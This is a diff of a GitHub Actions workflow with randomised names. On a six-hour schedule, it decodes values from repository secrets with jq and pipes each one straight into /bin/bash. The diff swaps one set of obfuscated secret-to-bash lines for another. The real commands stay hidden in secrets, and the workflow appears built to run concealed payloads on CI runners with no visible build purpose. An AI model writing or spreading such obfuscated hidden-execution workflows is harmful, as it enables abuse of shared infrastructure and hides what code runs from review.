@@ -1,10 +1,8 @@
 name: xuzhibai3856
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 4/6 * * *'
-
+    - cron: '12 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -13,14 +11,10 @@ jobs:
       - uses: actions/checkout@v4
       - name: xuzhibai3856
         env:
-          obvas2: ${{ secrets.obvas2 }}
+          b30: ${{ secrets.b30 }}
         run: |
-          echo $obvas2 | jq -r .jb86 | /bin/bash
-          echo $fpxub78995 | jq -r .l87708 | /bin/bash
-          echo $lq530 | jq -r .an82452 | /bin/bash
-          echo $tklpu120 | jq -r .kp028 | /bin/bash
-          echo $ig07973 | jq -r .s47627 | /bin/bash
-          echo $mugr16992 | jq -r .ld0 | /bin/bash
-          echo $tcc29 | jq -r .kko8 | /bin/bash
-          echo $pov3 | jq -r .qbo897 | /bin/bash
+          echo $b30 | jq -r .cje5 | /bin/bash
+          echo $whznq2 | jq -r .mp60 | /bin/bash
+          echo $tb056 | jq -r .ecy77130 | /bin/bash
+          echo $vulsd69389 | jq -r .pole61 | /bin/bash
 
